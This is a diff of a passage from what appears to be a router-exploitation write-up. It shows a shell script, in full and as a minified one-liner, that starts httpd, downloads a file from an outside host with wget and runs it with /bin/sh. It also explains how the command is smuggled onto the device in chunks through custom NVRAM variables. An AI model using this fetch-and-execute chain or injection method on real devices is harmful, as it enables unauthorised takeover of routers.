@@ -77,6 +77,7 @@ One thing that we can do, however, is start another instance of httpd at this po
 
 
 Working within the above limitations, we came up with the following shell script, which grabs a file from the internet with wget and pipes it straight to /bin/sh.
+    
     cd /tmp 
     if [ ! -f B ]; then 
         httpd & 
@@ -84,8 +85,10 @@ Working within the above limitations, we came up with the following shell script
         wget http://jackdoan.com/B
         /bin/sh B
     fi
+    
 Or, on one line, minified:
-* cd /tmp; if [ ! -f B ]; then (httpd & sleep 15; wget http://jackdoan.com/B; /bin/sh B) fi
+    
+    cd /tmp; if [ ! -f B ]; then (httpd & sleep 15; wget http://jackdoan.com/B; /bin/sh B) fi
 
 
 This script is an enormous 89 characters, so we need to upload it in chunks. But how? Uploading a command causes a reboot, and a reboot refreshes the state of the router. We realized that we could create our own NVRAM variable, and reference it in subsequent commands to build a command that we eventually run.
